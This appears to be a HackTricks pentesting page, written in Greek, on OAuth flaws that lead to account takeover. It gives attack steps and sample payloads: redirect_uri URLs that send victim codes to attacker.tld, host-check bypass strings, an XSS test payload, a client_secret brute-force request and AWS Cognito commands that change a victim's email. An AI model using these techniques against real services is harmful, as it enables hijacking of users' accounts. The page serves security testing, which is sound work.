# OAuth to Account takeover

{{#include ../banners/hacktricks-training.md}}

## Βασικές Πληροφορίες <a href="#d4a8" id="d4a8"></a>

OAuth προσφέρει διάφορες εκδόσεις, με βασικές πληροφορίες διαθέσιμες στο [OAuth 2.0 documentation](https://oauth.net/2/). Η συζήτηση εδώ επικεντρώνεται κυρίως στον ευρέως χρησιμοποιούμενο [OAuth 2.0 authorization code grant type](https://oauth.net/2/grant-types/authorization-code/), παρέχοντας ένα πλαίσιο εξουσιοδότησης που επιτρέπει σε μια εφαρμογή να αποκτήσει πρόσβαση ή να εκτελέσει ενέργειες στον λογαριασμό ενός χρήστη σε άλλη εφαρμογή (τον authorization server).

Σκεφτείτε έναν υποθετικό ιστότοπο _**https://example.com**_, σχεδιασμένο για να **εμφανίζει όλες τις αναρτήσεις σας στα social media**, συμπεριλαμβανομένων και των ιδιωτικών. Για αυτό χρησιμοποιείται το OAuth 2.0. Το _https://example.com_ θα ζητήσει την άδειά σας για να **προσπελάσει τις αναρτήσεις σας στα social media**. Ως αποτέλεσμα, θα εμφανιστεί μια οθόνη συναίνεσης στο _https://socialmedia.com_, που θα περιγράφει τις **άδειες που ζητούνται και τον developer που κάνει το αίτημα**. Μετά την εξουσιοδότησή σας, το _https://example.com_ αποκτά τη δυνατότητα να **προσπελάσει τις αναρτήσεις σας εξ ονόματός σας**.

Είναι σημαντικό να κατανοήσετε τα παρακάτω συστατικά στο πλαίσιο OAuth 2.0:

- **resource owner**: Εσείς, ως **χρήστης/οντότητα**, που εξουσιοδοτεί την πρόσβαση στον πόρο σας, π.χ. τις αναρτήσεις του λογαριασμού σας στα social media.
- **resource server**: Ο **διακομιστής που διαχειρίζεται τα authenticated αιτήματα** αφού η εφαρμογή έχει αποκτήσει ένα `access_token` εξ ονόματος του `resource owner`, π.χ. **https://socialmedia.com**.
- **client application**: Η **εφαρμογή που ζητάει εξουσιοδότηση** από τον `resource owner`, όπως το **https://example.com**.
- **authorization server**: Ο **διακομιστής που εκδίδει `access tokens`** στην `client application` μετά την επιτυχή αυθεντικοποίηση του `resource owner` και την εξασφάλιση της συναίνεσης, π.χ. **https://socialmedia.com**.
- **client_id**: Ένας δημόσιος, μοναδικός αναγνωριστής για την εφαρμογή.
- **client_secret:** Ένα εμπιστευτικό κλειδί, γνωστό μόνο στην εφαρμογή και στον authorization server, που χρησιμοποιείται για την παραγωγή `access_tokens`.
- **response_type**: Μια τιμή που καθορίζει **τον τύπο του token που ζητείται**, π.χ. `code`.
- **scope**: Το **επίπεδο πρόσβασης** που η `client application` ζητάει από τον `resource owner`.
- **redirect_uri**: Το **URL στο οποίο ο χρήστης ανακατευθύνεται μετά την εξουσιοδότηση**. Συνήθως πρέπει να συμφωνεί με το προ-καταχωρημένο redirect URL.
- **state**: Ένας παράμετρος για **τη διατήρηση δεδομένων κατά τη μεταφορά του χρήστη προς και από τον authorization server**. Η μοναδικότητά του είναι κρίσιμη καθώς λειτουργεί ως μηχανισμός προστασίας CSRF.
- **grant_type**: Μια παράμετρος που υποδεικνύει **τον τύπο grant και τον τύπο token που θα επιστραφεί**.
- **code**: Ο κωδικός εξουσιοδότησης από τον `authorization server`, που χρησιμοποιείται μαζί με το `client_id` και το `client_secret` από την client application για την απόκτηση ενός `access_token`.
- **access_token**: Το **token που χρησιμοποιεί η client application για API αιτήματα** εξ ονόματος του `resource owner`.
- **refresh_token**: Εξασφαλίζει στην εφαρμογή τη δυνατότητα να **λάβει νέο `access_token` χωρίς να επαναπροβάλει το αίτημα προς τον χρήστη**.

### Ροή

Η **πραγματική ροή OAuth** εξελίσσεται ως εξής:

1. Πηγαίνετε στο [https://example.com](https://example.com) και επιλέγετε το κουμπί “Integrate with Social Media”.
2. Ο ιστότοπος στέλνει ένα αίτημα στο [https://socialmedia.com](https://socialmedia.com) ζητώντας την άδειά σας για να επιτρέψει στην εφαρμογή του https://example.com να προσπελάσει τις αναρτήσεις σας. Το αίτημα διαμορφώνεται ως εξής:
```
https://socialmedia.com/auth
?response_type=code
&client_id=example_clientId
&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
&scope=readPosts
&state=randomString123
```
3. Στη συνέχεια σας εμφανίζεται μια σελίδα συγκατάθεσης.
4. Μετά την έγκρισή σας, Social Media στέλνει μια απάντηση στο `redirect_uri` με τις παραμέτρους `code` και `state`:
```
https://example.com?code=uniqueCode123&state=randomString123
```
5. https://example.com χρησιμοποιεί αυτό το `code`, μαζί με το `client_id` και το `client_secret`, για να κάνει ένα server-side request ώστε να λάβει ένα `access_token` εκ μέρους σας, επιτρέποντας πρόσβαση στα δικαιώματα που συμφωνήσατε:
```
POST /oauth/access_token
Host: socialmedia.com
...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"}
```
6. Τέλος, η διαδικασία ολοκληρώνεται καθώς https://example.com χρησιμοποιεί το `access_token` σας για να κάνει ένα API call σε κοινωνικό δίκτυο και να αποκτήσει πρόσβαση

## Ευπάθειες <a href="#id-323a" id="id-323a"></a>

### Open redirect_uri <a href="#cc36" id="cc36"></a>

Κατά [RFC 6749 §3.1.2](https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2), ο authorization server πρέπει να ανακατευθύνει τον browser μόνο σε **προεγγεγραμμένα, ακριβή redirect URIs**. Οποιοδήποτε κενό εδώ επιτρέπει σε έναν επιτιθέμενο να στείλει το θύμα μέσω ενός κακόβουλου authorization URL έτσι ώστε το IdP να παραδώσει τον `code` (και το `state`) του θύματος απευθείας σε ένα endpoint του επιτιθέμενου, ο οποίος μπορεί στη συνέχεια να τον εξαργυρώσει και να συλλέξει tokens.

Τυπική ροή επίθεσης:

1. Κατασκευάστε `https://idp.example/auth?...&redirect_uri=https://attacker.tld/callback` και στείλτε το στο θύμα.
2. Το θύμα αυθεντικοποιείται και εγκρίνει τα scopes.
3. Το IdP ανακατευθύνει σε `attacker.tld/callback?code=<victim-code>&state=...` όπου ο επιτιθέμενος καταγράφει το αίτημα και αμέσως ανταλλάσσει τον code.

Συνηθισμένα σφάλματα validation προς έλεγχο:

- **No validation** – οποιοδήποτε απόλυτο URL γίνεται αποδεκτό, με αποτέλεσμα άμεση κλοπή του code.
- **Weak substring/regex checks on the host** – παράκαμψη με lookalikes όπως `evilmatch.com`, `match.com.evil.com`, `match.com.mx`, `matchAmatch.com`, `evil.com#match.com`, ή `match.com@evil.com`.
- **IDN homograph mismatches** – η επαλήθευση γίνεται στη μορφή punycode (`xn--`), αλλά ο browser ανακατευθύνει στο Unicode domain που ελέγχεται από τον επιτιθέμενο.
- **Arbitrary paths on an allowed host** – δεικτοδοτώντας το `redirect_uri` σε `/openredirect?next=https://attacker.tld` ή σε οποιοδήποτε XSS/user-content endpoint διαρρέει ο code είτε μέσω αλυσιδωτών ανακατευθύνσεων, των Referer headers, είτε με injected JavaScript.
- **Directory constraints without normalization** – πρότυπα όπως `/oauth/*` μπορούν να παρακαμφθούν με `/oauth/../anything`.
- **Wildcard subdomains** – η αποδοχή `*.example.com` σημαίνει ότι κάθε takeover (dangling DNS, S3 bucket, κ.λπ.) αποδίδει άμεσα ένα έγκυρο callback.
- **Non-HTTPS callbacks** – η αποδοχή `http://` URIs δίνει στους network attackers (Wi‑Fi, corporate proxy) την ευκαιρία να αρπάξουν τον code εν πτήσει.

Ελέγξτε επίσης βοηθητικές παραμέτρους τύπου redirect (`client_uri`, `policy_uri`, `tos_uri`, `initiate_login_uri`, κ.λπ.) και το OpenID discovery document (`/.well-known/openid-configuration`) για πρόσθετα endpoints που μπορεί να κληρονομήσουν τα ίδια σφάλματα validation.

### XSS in redirect implementation <a href="#bda5" id="bda5"></a>

Όπως αναφέρεται σε αυτό το bug bounty report [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html), μπορεί να είναι δυνατόν η redirect **URL να αντικατοπτρίζεται στην απάντηση** του server μετά την αυθεντικοποίηση του χρήστη, καθιστώντας το **ευάλωτο σε XSS**. Πιθανικό payload για δοκιμή:
```
https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
```
### CSRF - Εσφαλμένη διαχείριση της παραμέτρου `state` <a href="#bda5" id="bda5"></a>

Η παράμετρος `state` είναι το CSRF token του Authorization Code flow: ο client πρέπει να δημιουργεί μια **κρυπτογραφικά τυχαία τιμή ανά instance browser**, να τη διατηρεί κάπου που μόνο αυτός ο browser μπορεί να διαβάσει (cookie, local storage, κ.λπ.), να τη στέλνει στο authorization request και να απορρίπτει οποιαδήποτε απάντηση που δεν επιστρέφει την ίδια τιμή. Όταν η τιμή είναι στατική, προβλέψιμη, προαιρετική ή δεν συνδέεται με το session του χρήστη, ο attacker μπορεί να ολοκληρώσει το δικό του OAuth flow, να καταγράψει το τελικό αίτημα `?code=` (χωρίς να το στείλει) και αργότερα να εξαναγκάσει τον browser του θύματος να αναπαράγει αυτό το αίτημα, ώστε ο λογαριασμός του θύματος να συνδεθεί με το profile του attacker στο identity provider.

Το μοτίβο replay είναι πάντα το ίδιο:

1. Ο attacker αυθεντικοποιείται στο IdP με τον λογαριασμό του και υποκλέπτει το τελευταίο redirect που περιέχει το `code` (και τυχόν `state`).
2. Απορρίπτει εκείνο το αίτημα, κρατάει το URL, και αργότερα εκμεταλλεύεται οποιοδήποτε CSRF primitive (σύνδεσμος, iframe, αυτόματα υποβαλλόμενη φόρμα) για να αναγκάσει τον browser του θύματος να το φορτώσει.
3. Αν ο client δεν εφαρμόζει το `state`, η εφαρμογή καταναλώνει το authorization αποτέλεσμα του attacker και κάνει login τον attacker στον λογαριασμό της εφαρμογής του θύματος.

Μια πρακτική λίστα ελέγχου για το χειρισμό του `state` κατά τη διάρκεια των tests:

- **Απουσία του `state` εντελώς** – αν η παράμετρος δεν εμφανίζεται ποτέ, ολόκληρο το login είναι επιρρεπές σε CSRF.
- **`state` δεν απαιτείται** – αφαιρέστε το από το αρχικό αίτημα· αν το IdP εξακολουθεί να εκδίδει codes που ο client αποδέχεται, η άμυνα είναι opt-in.
- **Το επιστρεφόμενο `state` δεν επικυρώνεται** – παραποιήστε την τιμή στην απάντηση (Burp, MITM proxy). Η αποδοχή μη ταιριαστών τιμών σημαίνει ότι το αποθηκευμένο token δεν συγκρίνεται ποτέ.
- **Προβλέψιμο ή καθαρά δεδομένα-οδηγούμενο `state`** – πολλές εφαρμογές τοποθετούν redirect paths ή JSON blobs στο `state` χωρίς να προσθέτουν τυχαιότητα, επιτρέποντας στον attacker να μαντέψει έγκυρες τιμές και να επαναλάβει flows. Πάντα προσθέστε ισχυρή εντροπία στην αρχή ή στο τέλος πριν από την κωδικοποίηση των δεδομένων.
- **Fixation του `state`** – αν η εφαρμογή επιτρέπει στους χρήστες να παρέχουν την τιμή του `state` (π.χ. μέσω crafted authorization URLs) και την επαναχρησιμοποιεί καθ' όλη τη ροή, ένας attacker μπορεί να καθορίσει μια γνωστή τιμή και να την επαναχρησιμοποιήσει σε πολλαπλά θύματα.

Το PKCE μπορεί να συμπληρώσει το `state` (ειδικά για public clients) δένοντας το authorization code σε έναν code verifier, αλλά οι web clients πρέπει ακόμη να παρακολουθούν το `state` για να αποτρέψουν cross-user CSRF/account-linking σφάλματα.

### Pre Account Takeover <a href="#ebe4" id="ebe4"></a>

1. **Without Email Verification on Account Creation**: Οι attackers μπορούν προληπτικά να δημιουργήσουν λογαριασμό χρησιμοποιώντας το email του θύματος. Αν το θύμα αργότερα χρησιμοποιήσει τρίτο πάροχο για login, η εφαρμογή μπορεί κατά λάθος να συνδέσει αυτόν τον τρίτο λογαριασμό με τον προ-δημιουργημένο λογαριασμό του attacker, οδηγώντας σε μη εξουσιοδοτημένη πρόσβαση.
2. **Exploiting Lax OAuth Email Verification**: Οι attackers μπορεί να εκμεταλλευτούν OAuth υπηρεσίες που δεν επαληθεύουν emails, εγγραφόμενοι στην υπηρεσία και αλλάζοντας μετά το email του λογαριασμού στο email του θύματος. Αυτή η μέθοδος επίσης κινδυνεύει να οδηγήσει σε μη εξουσιοδοτημένη πρόσβαση, παρόμοια με το πρώτο σενάριο αλλά μέσω διαφορετικού attack vector.

### Disclosure of Secrets <a href="#e177" id="e177"></a>

Το `client_id` είναι σκοπίμως δημόσιο, αλλά το **`client_secret` δεν πρέπει ποτέ να είναι ανακτήσιμο από τελικούς χρήστες**. Οι υλοποιήσεις του Authorization Code που ενσωματώνουν το secret σε **mobile APKs, desktop clients, ή single-page apps** ουσιαστικά παραδίδουν αυτό το credential σε οποιονδήποτε μπορεί να κατεβάσει το πακέτο. Πάντα ελέγχετε public clients με:

- Αποσυμπιέζοντας το APK/IPA, τον desktop installer ή την Electron app και ψάχνοντας για `client_secret`, Base64 blobs που αποκωδικοποιούνται σε JSON, ή hard-coded OAuth endpoints.
- Ελέγχοντας τα ενσωματωμένα αρχεία config (plist, JSON, XML) ή decompiled strings για client credentials.

Μόλις ο attacker εξάγει το secret, χρειάζεται μόνο να κλέψει οποιοδήποτε authorization `code` του θύματος (μέσω ενός αδύναμου `redirect_uri`, logs, κ.λπ.) για να χτυπήσει ανεξάρτητα το `/token` και να δημιουργήσει access/refresh tokens χωρίς την εμπλοκή της νόμιμης app. Θεωρήστε public/native clients ως **ανίκανα να κρατήσουν μυστικά** — θα πρέπει αντ' αυτού να στηρίζονται στο PKCE (RFC 7636) για να αποδείξουν την κατοχή ενός per-instance code verifier αντί ενός στατικού secret. Κατά τη διάρκεια των tests, επιβεβαιώστε εάν το PKCE είναι υποχρεωτικό και εάν το backend πράγματι απορρίπτει ανταλλαγές token που παραλείπουν είτε το `client_secret` **ή** έναν έγκυρο `code_verifier`.

### Client Secret Bruteforce

Μπορείτε να προσπαθήσετε να **bruteforce το `client_secret`** ενός service provider με τον identity provider προκειμένου να προσπαθήσετε να κλέψετε λογαριασμούς.\
Το αίτημα για BF μπορεί να μοιάζει με το εξής:
```
POST /token HTTP/1.1
content-type: application/x-www-form-urlencoded
host: 10.10.10.10:3000
content-length: 135
Connection: close

code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
```
### Referer/Header/Location artifacts leaking Code + State

Μόλις ο client έχει τα **code και state**, αν εμφανιστούν στο **`location.href`** ή **`document.referrer`** και προωθηθούν σε τρίτους, leak. Δύο επαναλαμβανόμενα μοτίβα:

- **Classic Referer leak**: μετά το OAuth redirect, οποιαδήποτε πλοήγηση που διατηρεί το `?code=&state=` στο URL θα τα ωθήσει στο header **Referer** που αποστέλλεται σε CDNs/analytics/ads.
- **Telemetry/analytics confused deputy**: κάποια SDKs (pixels/JS loggers) αντιδρούν σε `postMessage` events και στη συνέχεια **στέλνουν το τρέχον `location.href`/`referrer` σε backend APIs χρησιμοποιώντας ένα token που παρέχεται στο μήνυμα**. Αν μπορείτε να εισάγετε το δικό σας token σε αυτή τη ροή (π.χ. μέσω ενός attacker-controlled postMessage relay), μπορείτε αργότερα να διαβάσετε το history/logs των API requests του SDK και να ανακτήσετε τα OAuth artifacts του θύματος που είναι ενσωματωμένα σε αυτά τα requests.

### Access Token Stored in Browser History

Η βασική εγγύηση του Authorization Code grant είναι ότι **access tokens δεν φτάνουν ποτέ στον browser του resource owner**. Όταν υλοποιήσεις leak tokens client-side, οποιοδήποτε μικρό σφάλμα (XSS, Referer leak, proxy logging) γίνεται άμεση παραβίαση λογαριασμού. Πάντα έλεγχε για:

- **Tokens in URLs** – αν το `access_token` εμφανίζεται στο query/fragment, καταγράφεται στο browser history, server logs, analytics και στα headers Referer που στέλνονται σε τρίτους.
- **Tokens transiting untrusted middleboxes** – η επιστροφή tokens μέσω HTTP ή μέσω debugging/corporate proxies επιτρέπει σε παρατηρητές του δικτύου να τα καταγράψουν άμεσα.
- **Tokens stored in JavaScript state** – React/Vue stores, global variables ή σειριοποιημένα JSON blobs εκθέτουν τα tokens σε κάθε script στην origin (συμπεριλαμβανομένων XSS payloads ή κακόβουλων extensions).
- **Tokens persisted in Web Storage** – `localStorage`/`sessionStorage` κρατούν tokens πολύ μετά το logout σε κοινές συσκευές και είναι προσβάσιμα από scripts.

Οποιοδήποτε από αυτά τα ευρήματα συνήθως αναβαθμίζει αλλιώς “low” bugs (όπως ένα CSP bypass ή DOM XSS) σε πλήρη API takeover επειδή ο attacker μπορεί απλά να διαβάσει και να αναπαράγει το leaked bearer token.

### Everlasting Authorization Code

Οι authorization codes πρέπει να είναι **short-lived, single-use, and replay-aware**. Όταν αξιολογείς μια ροή, σύλληψε ένα `code` και:

- **Test the lifetime** – το RFC 6749 προτείνει λεπτά, όχι ώρες. Δοκίμασε να εξαργυρώσεις το code μετά από 5–10 λεπτά· αν ακόμη λειτουργεί, το παράθυρο έκθεσης για οποιοδήποτε leaked code είναι υπερβολικό.
- **Test sequential reuse** – στείλε το ίδιο `code` δύο φορές. Αν το δεύτερο request αποδώσει άλλο token, οι attackers μπορούν να κλωνοποιήσουν sessions επ’ αόριστον.
- **Test concurrent redemption/race conditions** – εκτέλεσε δύο token requests παράλληλα (Burp intruder, turbo intruder). Αδύναμοι issuers μερικές φορές εκδίδουν και τα δύο.
- **Observe replay handling** – μια προσπάθεια reuse δεν πρέπει μόνο να αποτύχει αλλά και να ανακαλέσει τυχόν tokens που ήδη εκδόθηκαν από αυτό το code. Διαφορετικά, ένα εντοπισμένο replay αφήνει ενεργό το πρώτο token του attacker.

Ο συνδυασμός ενός replay-friendly code με οποιοδήποτε `redirect_uri` ή bug καταγραφής επιτρέπει επίμονη πρόσβαση στον λογαριασμό ακόμα και μετά ο θύμα ολοκληρώσει το νόμιμο login.

### Authorization/Refresh Token not bound to client

Αν μπορείτε να αποκτήσετε το **authorization code** και να το **εξαργυρώσετε για διαφορετικό client/app**, μπορείτε να αναλάβετε άλλους λογαριασμούς. Δοκιμάστε για αδύναμη δέσμευση με:

- Καταγράψτε ένα `code` για **app A** και στείλτε το στο token endpoint του **app B**· αν λάβετε ακόμη token, το audience binding είναι σπασμένο.
- Δοκιμάστε first-party token minting endpoints που θα πρέπει να περιορίζονται στα δικά τους client IDs· αν αποδέχονται arbitrary `state`/`app_id` ενώ ελέγχουν μόνο τον code, στην ουσία εκτελείτε ένα **authorization-code swap** για να εκδώσετε first-party tokens με υψηλότερα προνόμια.
- Ελέγξτε αν η client binding αγνοεί mismatches σε nonce/redirect URI. Αν μια error page φορτώνει ακόμα SDKs που logάρουν το `location.href`, συνδυάστε με Referer/telemetry leaks για να κλέψετε codes και να τα εξαργυρώσετε αλλού.

Κάθε endpoint που ανταλλάσσει `code` → token πρέπει να επαληθεύει τον issuing client, το redirect URI και το nonce· αλλιώς, ένα κλεμμένο code από οποιαδήποτε app μπορεί να αναβαθμιστεί σε first-party access token.

### Happy Paths, XSS, Iframes & Post Messages to leak code & state values

[**Check this post**](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)

### AWS Cognito <a href="#bda5" id="bda5"></a>

Στην αναφορά bug bounty: [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/) μπορείτε να δείτε ότι το **token** που **AWS Cognito** επιστρέφει στον χρήστη μπορεί να έχει **επαρκή δικαιώματα για να αντικαταστήσει τα δεδομένα του χρήστη**. Επομένως, αν μπορείτε να **αλλάξετε το user email σε διαφορετικό user email**, μπορεί να είστε σε θέση να **αναλάβετε** λογαριασμούς άλλων.
```bash
# Read info of the user
aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]

# Change email address
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
{
"CodeDeliveryDetailsList": [
{
"Destination": "i***@f***.com",
"DeliveryMedium": "EMAIL",
"AttributeName": "email"
}
]
}
```
Για περισσότερες λεπτομέρειες σχετικά με το πώς να καταχραστείτε το AWS Cognito δείτε [AWS Cognito - Unauthenticated Enum Access](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html).

### Κατάχρηση token άλλων εφαρμογών <a href="#bda5" id="bda5"></a>

Όπως [**mentioned in this writeup**](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts), οι ροές OAuth που αναμένουν να λάβουν το **token** (και όχι έναν κωδικό) μπορεί να είναι ευάλωτες εάν δεν ελέγχουν ότι το token ανήκει στην app.

Αυτό συμβαίνει επειδή ένας **attacker** θα μπορούσε να δημιουργήσει μια **application supporting OAuth and login with Facebook** (για παράδειγμα) στη δική του εφαρμογή. Στη συνέχεια, μόλις ένας victim κάνει login με Facebook στην **attackers application**, ο attacker θα μπορούσε να πάρει το **OAuth token** του χρήστη που δόθηκε στη δική του εφαρμογή, και να το χρησιμοποιήσει για να κάνει login στην victim OAuth application χρησιμοποιώντας το token του χρήστη.

> [!CAUTION]
> Επομένως, αν ο attacker καταφέρει να κάνει τον χρήστη να αποκτήσει πρόσβαση στην δική του OAuth εφαρμογή, θα μπορέσει να αναλάβει τον λογαριασμό του victim σε εφαρμογές που περιμένουν ένα token και δεν ελέγχουν αν το token εκδόθηκε για το app ID τους.

### Two links & cookie <a href="#bda5" id="bda5"></a>

Σύμφωνα με [**this writeup**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), ήταν δυνατό να γίνει ο victim να ανοίξει μια σελίδα με ένα **returnUrl** που δείχνει στον attackers host. Αυτή η πληροφορία θα **αποθηκευόταν σε ένα cookie (RU)** και σε ένα **μετέπειτα βήμα** το **prompt** θα **ρωτούσε** τον **user** αν θέλει να δώσει πρόσβαση σε εκείνον τον attackers host.

Για να παρακαμφθεί αυτό το prompt, ήταν δυνατό να ανοίξει ένα tab για να ξεκινήσει η **Oauth flow** που θα ρύθμιζε αυτό το RU cookie χρησιμοποιώντας το **returnUrl**, να κλείσει το tab πριν εμφανιστεί το prompt, και να ανοίξει ένα νέο tab χωρίς αυτή την τιμή. Τότε, το **prompt δεν θα ενημερώνει για τον attackers host**, αλλά το cookie θα έχει οριστεί σε αυτόν, οπότε το **token θα σταλεί στον attackers host** στην ανακατεύθυνση.

### Prompt Interaction Bypass <a href="#bda5" id="bda5"></a>

Όπως εξηγείται σε [**this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), ορισμένες υλοποιήσεις OAuth επιτρέπουν να δηλωθεί η GET παράμετρος **`prompt`** ως None (**`&prompt=none`**) για να **αποτραπεί το να ζητηθεί από τους χρήστες να επιβεβαιώσουν** την παρεχόμενη πρόσβαση μέσω ενός prompt στο web, εάν είναι ήδη συνδεδεμένοι στην πλατφόρμα.

### response_mode

Όπως [**explained in this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), ίσως είναι δυνατό να υποδείξετε την παράμετρο **`response_mode`** για να καθορίσετε πού θέλετε να δοθεί ο code στην τελική URL:

- `response_mode=query` -> Ο code παρέχεται μέσα σε GET παράμετρο: `?code=2397rf3gu93f`
- `response_mode=fragment` -> Ο code παρέχεται μέσα στο fragment της URL `#code=2397rf3gu93f`
- `response_mode=form_post` -> Ο code παρέχεται μέσα σε μια POST φόρμα με ένα input ονομαζόμενο `code` και την τιμή
- `response_mode=web_message` -> Ο code αποστέλλεται σε post message: `window.opener.postMessage({"code": "asdasdasd...`

### Clickjacking OAuth consent dialogs

Τα OAuth consent/login dialogs είναι ιδανικοί στόχοι για Clickjacking: εάν μπορούν να ενσωματωθούν σε frame, ένας attacker μπορεί να τοποθετήσει προσαρμοσμένα γραφικά πάνω τους, να κρύψει τα πραγματικά κουμπιά και να εξαπατήσει τους χρήστες ώστε να εγκρίνουν επικίνδυνα scopes ή να συνδέσουν λογαριασμούς. Δημιουργήστε PoC που:

1. Φορτώνουν το IdP authorization URL μέσα σε ένα `<iframe sandbox="allow-forms allow-scripts allow-same-origin">`.
2. Χρησιμοποιούν τεχνικές absolute positioning/opacity για να ευθυγραμμίσουν ψεύτικα κουμπιά με τους κρυμμένους **Allow**/**Approve** controls.
3. Προαιρετικά προ-συμπληρώνουν παραμέτρους (scopes, redirect URI) ώστε η κλεμμένη έγκριση να ωφελήσει άμεσα τον attacker.

Κατά τη δοκιμή, επιβεβαιώστε ότι οι σελίδες IdP εκπέμπουν είτε `X-Frame-Options: DENY/SAMEORIGIN` είτε ένα περιοριστικό `Content-Security-Policy: frame-ancestors 'none'`. Εάν κανένα από τα δύο δεν υπάρχει, επιδείξτε τον κίνδυνο με εργαλεία όπως [NCC Group’s clickjacking PoC generator](https://github.com/nccgroup/clickjacking-poc) και καταγράψτε πόσο εύκολα ένας victim εξουσιοδοτεί το attacker’s app. Για επιπλέον ιδέες payload δείτε [Clickjacking](clickjacking.md).

### OAuth ROPC flow - 2 FA bypass <a href="#b440" id="b440"></a>

Σύμφωνα με [**this blog post**](https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96), αυτή είναι μια OAuth flow που επιτρέπει login στο OAuth μέσω **username** και **password**. Εάν σε αυτή την απλή ροή επιστρέφεται ένα **token** με πρόσβαση σε όλες τις ενέργειες που μπορεί να εκτελέσει ο χρήστης, τότε είναι δυνατό να παρακαμφθεί το 2FA χρησιμοποιώντας αυτό το token.

### ATO on web page redirecting based on open redirect to referrer <a href="#bda5" id="bda5"></a>

Αυτό το [**blogpost**](https://blog.voorivex.team/oauth-non-happy-path-to-ato) περιγράφει πώς ήταν δυνατό να καταχραστεί ένα **open redirect** με βάση την τιμή του **referrer** για να πραγματοποιηθεί OAuth → ATO. Η επίθεση ήταν:

1. Ο victim επισκέπτεται τη web σελίδα του attacker.
2. Ο victim ανοίγει το κακόβουλο link και ένας opener ξεκινά το Google OAuth flow με `response_type=id_token,code&prompt=none` ως επιπλέον παραμέτρους, χρησιμοποιώντας ως **referrer την ιστοσελίδα του attacker**.
3. Στον opener, αφού ο provider εξουσιοδοτήσει τον victim, τον επιστρέφει στην τιμή της παραμέτρου `redirect_uri` (η web σελίδα του victim) με 30X ανακατεύθυνση που διατηρεί ακόμα την ιστοσελίδα του attacker στο referer.
4. Η web σελίδα του victim ενεργοποιεί το open redirect βάσει του referrer, ανακατευθύνοντας τον victim στην ιστοσελίδα του attacker· αφού το **`respose_type`** ήταν **`id_token,code`**, ο code θα σταλεί πίσω στον attacker στο fragment της URL, επιτρέποντάς του να αναλάβει τον λογαριασμό του χρήστη μέσω Google στον ιστότοπο του victim.

### SSRFs parameters <a href="#bda5" id="bda5"></a>

[**Check this research**](https://portswigger.net/research/hidden-oauth-attack-vectors) **Για περισσότερες λεπτομέρειες αυτής της τεχνικής.**

Η Dynamic Client Registration στο OAuth λειτουργεί ως ένας λιγότερο προφανής αλλά κρίσιμος φορέας για ευπάθειες ασφαλείας, ειδικά για επιθέσεις **Server-Side Request Forgery (SSRF)**. Αυτό το endpoint επιτρέπει στους OAuth servers να λαμβάνουν λεπτομέρειες για client applications, συμπεριλαμβανομένων ευαίσθητων URLs που μπορούν να εκμεταλλευτούν.

Key Points:

- Η **Dynamic Client Registration** συχνά χαρτογραφείται σε `/register` και δέχεται λεπτομέρειες όπως `client_name`, `client_secret`, `redirect_uris`, καθώς και URLs για λογότυπα ή JSON Web Key Sets (JWKs) μέσω POST αιτήσεων.
- Η λειτουργία αυτή ακολουθεί τις προδιαγραφές στο **RFC7591** και **OpenID Connect Registration 1.0**, που περιλαμβάνουν παραμέτρους πιθανώς ευάλωτες σε SSRF.
- Η διαδικασία εγγραφής μπορεί άθελά της να εκθέσει servers σε SSRF με διάφορους τρόπους:
  - **`logo_uri`**: Ένα URL για το λογότυπο της client εφαρμογής που ίσως ο server επιχειρήσει να φορτώσει, προκαλώντας SSRF ή οδηγώντας σε XSS αν το URL χειριστεί λανθασμένα.
  - **`jwks_uri`**: Ένα URL για το JWK έγγραφο του client, που αν δημιουργηθεί κακόβουλα, μπορεί να κάνει τον server να πραγματοποιήσει εξερχόμενα αιτήματα σε έναν attacker-controlled server.
  - **`sector_identifier_uri`**: Αναφέρεται σε ένα JSON array με `redirect_uris`, το οποίο ο server μπορεί να κάνει fetch, δημιουργώντας ευκαιρία για SSRF.
  - **`request_uris`**: Λίστες επιτρεπόμενων request URIs για τον client, που μπορούν να εκμεταλλευτούν αν ο server τα κάνει fetch στην αρχή της διαδικασίας authorization.

Exploitation Strategy:

- SSRF μπορεί να προκληθεί εγγράφοντας ένα νέο client με κακόβουλα URLs σε παραμέτρους όπως `logo_uri`, `jwks_uri` ή `sector_identifier_uri`.
- Ενώ η άμεση εκμετάλλευση μέσω `request_uris` μπορεί να μετριαστεί από whitelist ελέγχους, η παροχή ενός προ-εγγεγραμμένου, attacker-controlled `request_uri` μπορεί να διευκολύνει SSRF κατά τη φάση authorization.

### OAuth/OIDC Discovery URL Abuse & OS Command Execution

